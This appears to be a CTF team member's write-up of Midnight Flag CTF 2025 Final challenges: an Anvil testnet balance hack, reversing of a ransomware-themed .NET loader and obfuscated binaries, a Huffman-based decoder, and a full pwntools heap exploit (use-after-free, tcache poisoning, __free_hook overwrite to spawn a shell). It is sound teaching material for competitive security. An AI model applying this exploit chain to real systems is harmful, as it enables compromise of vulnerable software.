# Midnight CTF 2025 Final

I participated Midnight Flag CTF 2025 Final!.

Our team [m01nm01n](https://m01nm01n.github.io/) won 3rd place in student score board.

![moinmoin_smal.png](moinmoin_smal.png)

![Top 10 Teams.png](Top 10 Teams.png)

I solved 3 reversing, 1 blockchain. This article is the article for those 3 challenges and unsolved one pwn challenge.

## ForgeNet (413 pts, 12 solves)
<primary-label ref="BLOCK CHAIN"/>

> You've infiltratred a NeuraTek bot factory. You just found a computer which seems to control the creation of bots. I'm sure it's possible to exploit it. You have to find the vulnerability and take control of the computer to stop this factory for creating new bots.
{style=note}
 
the problem is simple. the problem is the blockchain was an Anvil testnet node which provides special debugging/testing RPC methods.

The most direct approach was using anvil_setBalance to give myself the 2077 ETH.
Also, the challenge required blocks to mine every exactly 10 seconds.

```py
from web3 import Web3
from eth_account import Account

RPC_URL = "http://chall4.midnightflag.fr:11387/rpc"
PRIVATE_KEY = "ca517242cb8b64d1e547079eb4c31d0497c5086b70a7a10f2410d93b19f2fde9"
CHAIN_ID = 2077

class FreshForgeNetSolver:
    def __init__(self):
        self.w3 = Web3(Web3.HTTPProvider(RPC_URL))
        self.account = Account.from_key(PRIVATE_KEY)
        self.address = self.account.address

    def solve(self):
        target_balance_wei = self.w3.to_wei(2077, 'ether')
        target_balance_hex = hex(target_balance_wei)
        
        result = self.w3.manager.request_blocking("anvil_setBalance", [self.address, target_balance_hex])
        balance = self.w3.eth.get_balance(self.address)
        balance_eth = self.w3.from_wei(balance, 'ether')
        
        if balance_eth >= 2077:
            print("got 2077 eth")
        else:
            print("failed")
            
        self.w3.manager.request_blocking("evm_setAutomine", [False])
        
        result1 = self.w3.manager.request_blocking("anvil_setIntervalMining", [10])
        print(f"{result1=}")
        
        result2 = self.w3.manager.request_blocking("evm_setIntervalMining", [10])  
        print(f"{result2=}")
            
        
        final_balance = self.w3.eth.get_balance(self.address)
        final_balance_eth = self.w3.from_wei(final_balance, 'ether')
        
        if final_balance_eth >= 2077:
            print("success")
        else:
            print("failed")
        
        print("=" * 60)

if __name__ == "__main__":
    solver = FreshForgeNetSolver()
    solver.solve()
```

This solver gave me 2077 ETH, and we got the flag.

## BadRandom (442 pts, 10 solves)
<primary-label ref="rev"/>

Distributed file was .Net assembly.
```bash
[~/dc/ctf/midfinal/rev]$file RansomwareApp.exe
RansomwareApp.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
```

After I disassembled the PE, I noticed that the PE change themselves (self-modify binary) after several encrypt processes.

```C#
	private static int Main(string[] args)
	{
		uint[] array = new uint[]
		{
			504660068U,
			3723092805U,
			3886551440U,
			
			//.................................................

		    71334844U,
			2984773153U,
			2971342866U
		};
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		Module manifestModule = executingAssembly.ManifestModule;
		GCHandle gchandle = <Module>.Decrypt(array, 3531425751U);
		byte[] array2 = (byte[])gchandle.Target;
		Module module = executingAssembly.LoadModule("koi", array2);
		Array.Clear(array2, 0, array2.Length);
		gchandle.Free();
		Array.Clear(array, 0, array.Length);
		<Module>.key = manifestModule.ResolveSignature(285212673);
		AppDomain.CurrentDomain.AssemblyResolve += <Module>.Resolve;
		module.GetTypes();
		MethodBase methodBase = module.ResolveMethod((int)<Module>.key[0] | (int)<Module>.key[1] << 8 | (int)<Module>.key[2] << 16 | (int)<Module>.key[3] << 24);
		object[] array3 = new object[methodBase.GetParameters().Length];
		if (array3.Length != 0)
		{
			array3[0] = args;
		}
		object obj = methodBase.Invoke(null, array3);
		if (obj is int)
		{
			return (int)obj;
		}
		return 0;
	}
```

I changed the last part of Main, and got the .dll file.

```C#
GCHandle gchandle = Decrypt(array, 3531425751U);
byte[] array2 = (byte[])gchandle.Target;

string outputFile = "extracted.dll";
File.WriteAllBytes(outputFile, array2);
```

Extracted .dll was also .Net assembly, so I disassembled again.


After analyzing few classes, I found the hard-coded AES-IV and Key.

![screenshot.png](screenshot.png)

```C#
	// Token: 0x04000001 RID: 1
	private static readonly byte[] AesKey = Encoding.UTF8.GetBytes("Xmy0nlyRegr3tsLockbitW0ntHir3MeX");

	// Token: 0x04000002 RID: 2
	private static readonly byte[] AesIV = Encoding.UTF8.GetBytes("L3v3lIsInsan3Br0");
```

## Neuronet (454 pts, 9 solves)
<primary-label ref="rev"/>

> A military artificial intelligence, deactivated since the Great Cyber Outage of 2069, has mysteriously reactivated a connection terminal. This terminal, called NeuroNet, is requesting an access key. Your mission, should you choose to accept it, is to gain access to the terminal and retrieve the classified data. — Jim Phelps
{style=note} 

The distributed file was PE again :cry: .
This program modify user input with MAC and time stamp. That doesn't matter.

The important part is `sub_1400016E0` and `sub_1400061E0`.

* `sub_1400016E0`
  * this function xor data which pointed from `xmmword_14000C040`.

![Screenshot_20250625_215703.png](Screenshot_20250625_215703.png)

* `sub_1400061E0`
  * this function set the operation pointer `xmmword_14000C040`.

![Screenshot_20250625_215607.png](Screenshot_20250625_215607.png)

```log
rdata:0000000140008960 xmmword_140008960 xmmword 1D0F37752C7637131D21732F762C1B26h
.rdata:0000000140008960                                         ; DATA XREF: sub_1400061E0+124↑r
.rdata:0000000140008970 xmmword_140008970 xmmword 3B30713677760F1D2630723577777612h
.rdata:0000000140008970                                         ; DATA XREF: sub_1400061E0+137↑r
```

```c
v2 = (__m128i *)operator new((unsigned __int64)Function);
v3 = _mm_loadu_si128((const __m128i *)&xmmword_140008960);
*(_QWORD *)&xmmword_14000C040 = v2;
v4 = _mm_loadu_si128((const __m128i *)&xmmword_140008970);
qword_14000C050 = (__int64)v2[2].m128i_i64 + 1;
v2[2].m128i_i8[0] = 99;
```

```py
xmm1 = "1D0F37752C7637131D21732F762C1B26"
xmm2 = "3B30713677760F1D2630723577777612" 
xmm3 = "63"

def hex_to_bytes_le(hex_str):
    bytes_be = bytes.fromhex(hex_str)
    return bytes_be[::-1]

b1 = hex_to_bytes_le(xmm1)
b2 = hex_to_bytes_le(xmm2)
b3 = bytes.fromhex(xmm3)

a = b1 + b2 + b3

d = ''.join(chr(b ^ 0x42) for b in a)

print(f"MCTF{{{d}}}")
```

## Logic bomb (489 pts, 5 solves)
<primary-label ref="rev"/>

> Juste before his retirement, my colleague at NeuraTek told me he left a logic bomb on the company server.
> I couldn't find the bomb itself, but he left me the binary he plans to deploy and a sample encrypted file. He said that if I can reverse-engineer the algorithm before he launches it, I'll be able to decrypt every files he encrypts when the time comes. He also said that the algorithm is well known and that I should be able to find it easily, but I don't know much about reverse engineering.
> That's why I'm asking for your help !
{style=note} 

this challenge encrypt file with original encryption.

* `sub_401650` Counts byte frequencies, builds a Huffman tree, drives the whole process.
* `sub_401D80` Serialises the tree pre-order, each node = (`sym ^ 0xBABE, freq ^ 0xCAFE`).
* `sub_401E20` Walks the tree, assigns bit-codes (left=0, right=1).
* `sub_401F70` Returns total node count (written as the first dword).

No crypto, just XOR obfuscation of header values.

The solver isn't hard to code. so I ordered it to LLMs :lmao:.

```Py
import struct
import sys
from typing import Tuple, Iterator

BABE = 0xBABE
CAFE = 0xCAFE
INTERNAL = 0xFFFFFFFF


class Node:
    __slots__ = ("sym", "left", "right")

    def __init__(self, sym: int):
        self.sym = sym
        self.left: "Node | None" = None
        self.right: "Node | None" = None

    def is_leaf(self) -> bool:
        return self.left is None and self.right is None


def read_tree(blob: bytes, pos: int = 0) -> Tuple[Node, int]:
    sym_xor, freq_xor = struct.unpack_from("<II", blob, pos)
    pos += 8
    sym = sym_xor ^ BABE
    _ = freq_xor ^ CAFE  # frequency value is not needed for decoding
    node = Node(sym)
    if sym == INTERNAL:
        node.left, pos = read_tree(blob, pos)
        node.right, pos = read_tree(blob, pos)
    return node, pos


def bit_stream(data: bytes, pad_bits: int) -> Iterator[int]:
    total = len(data) * 8 - pad_bits
    produced = 0
    for byte in data:
        for shift in range(7, -1, -1):
            if produced == total:
                return
            yield (byte >> shift) & 1
            produced += 1


def decode(inp: str, out: str) -> None:
    with open(inp, "rb") as f:
        node_count = struct.unpack("<I", f.read(4))[0]

        tree_blob = f.read(node_count * 8)
        root, consumed = read_tree(tree_blob)
        assert consumed == len(tree_blob), "tree length mismatch"

        original_len = struct.unpack("<Q", f.read(8))[0]

        rest = f.read()
        if not rest:
            raise ValueError("file truncated: missing bit-stream")
        pad_bits = rest[-1]
        bit_bytes = rest[:-1]

    out_data = bytearray()
    node = root
    for bit in bit_stream(bit_bytes, pad_bits):
        node = node.left if bit == 0 else node.right
        if node.is_leaf():
            out_data.append(node.sym & 0xFF)
            if len(out_data) == original_len:
                break
            node = root

    if len(out_data) != original_len:
        raise ValueError("decompression ended early/late")

    with open(out, "wb") as f:
        f.write(out_data)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.exit(f"Usage: {sys.argv[0]} <input.enc> <output.raw>")
    decode(sys.argv[1], sys.argv[2])
    print("OK – written", sys.argv[2])
```

![out.png](out.png)

## Bot Factory (489 pts, 5 solves)
<primary-label ref="pwn"/>

> You've infiltratred a NeuraTek bot factory. You just found a computer which seems to control the creation of bots. I'm sure it's possible to exploit it. You have to find the vulnerability and take control of the computer to stop this factory for creating new bots.
{style=note}
 
The vulnerability was quite simple.

```c
void __cdecl self_destruction(bot_entry *bots, uint64_t idx)
{
  printf("Bot n°%lu's self-destruction mode activated!\n", idx);
  puts("The bot will accomplish its duty");
  puts("BoOooMMM!\n\n");
  free(bots[idx].command);
}
```
`self_detruction` command free `bots[idx].command` but it forgets to clear the `bots[idx].command`.
leak libc address from `unsorted_bins` and `tcache poisoning` to AAW.

I overwrote `00000000001eeb28 V __free_hook@@GLIBC_2.2.5` and got the shell.
 
```py
from pwn import *
import sys

e = ELF("botFactory_patched",checksec=False)
libc = ELF("libc.so.6",checksec=False)
ld = ELF("ld-linux-x86-64.so.2",checksec=False)

nc = "nc 127.0.0.1 9999"
HOST = nc.split(" ")[1]
PORT = int(nc.split(" ")[2])

dbg = 1
g_script = """
    #set max-visualize-chunk-size 0x300
    #b free@plt
"""

context.binary = e
if len(sys.argv) > 1:
    io = remote(host=HOST,port=PORT)
else:
    io = e.process()
    if dbg:
        gdb.attach(io,g_script)

s   = lambda b: io.send(b)
sa  = lambda a,b: io.sendafter(a,b)
sl  = lambda b: io.sendline(b)
sla = lambda a,b: io.sendlineafter(a,b)
r   = lambda : io.recv()
ru  = lambda b:io.recvuntil(b)
rl  = lambda : io.recvline()
pu32= lambda b : u32(b.ljust(4,b"\0"))
pu64= lambda b : u64(b.ljust(8,b"\0"))
hlog= lambda i : print(f"[*]{hex(i)}")
shell = lambda : io.interactive()
payload = b""
def pay64(adr:int):global payload;payload = p64(adr)
def add64(adr:int):global payload;payload+= p64(adr)
def paybyte(data:bytes):global payload;payload = data
def addbyte(data:bytes):global payload;payload+= data

def create(power: int, spec: int):
    log.info("create")
    ru(b"5) Destroy a bot\n\n> ")
    sl(b"1")
    ru(b"> ")
    sl(str(power).encode())
    ru(b"> ")
    sl(str(spec).encode())

def view():
    log.info("view")
    ru(b"5) Destroy a bot\n\n> ")
    sl(b"3")
    return io.recvuntil(b"What is the next action?", drop=True)

def edit(bot: int, command: bytes):
    log.info("edit")
    ru(b"5) Destroy a bot\n\n> ")
    sl(b"2")
    ru(b"> ") 
    sl(str(bot).encode())
    ru(b"> ")
    sl(command)


def execute(bot: int):
    log.info("execute")
    ru(b"5) Destroy a bot\n\n> ")
    sl(b"4")
    ru(b"> ")
    sl(str(bot).encode())
    return io.recvuntil(b"What is the next action?", drop=True)


def destroy(bot: int):
    log.info("destroy")
    ru(b"5) Destroy a bot\n\n> ")
    sl(b"5")
    ru(b"> ")
    sl(str(bot).encode())


for i in range(12):
    print(f"Allocate 0x80 -> idx {i+1}")
    create(0x80, 2)
    edit(i+1, (str(i+1).encode())*0x40)

edit(11, b"FUCK"*0x10)
print(f"Allocate 0x80 -> idx {11}")


for i in range(7):
    print(f"Free 0x80 -> idx {i+1}")
    destroy(i+1)

destroy(11)

r()
sl(b"3")
print(r().decode())

sl(b"4")
sl(b"10")

r()
sl(b"3")
leaks = r().split(b"\n")
for l in leaks:
    if b"n\xc2\xb010" in l:
        leak = l.split(b" ")[1]

print(leak)
leak = pu64(leak)
hlog(leak)

libc.address = leak - (0x76e93a29cbe0 - 0x000076e93a0b1000)
hlog(libc.address)

sl(b"3")

create(0x20, 2)
edit(14, b"/bin/sh\x00")

free_hook = 0x0000000001eeb28+libc.address

create(0x40, 2)
create(0x40, 2)
edit(15, b"Z"*0x30)
edit(16, b"Y"*0x30)

sl(b"4")
sl(b"15")
sl(b"4")
sl(b"16")

r()
sl(b"3")

edit(16, p64(free_hook)+b"HUGEHUGEHUGE")
create(0x40, 2)
create(0x40, 2)
edit(17, p64(libc.sym.system)+b"HOGEHOGE")
edit(18, p64(libc.sym.system)+b"HOGEHOGE")

destroy(14)

shell()
```
 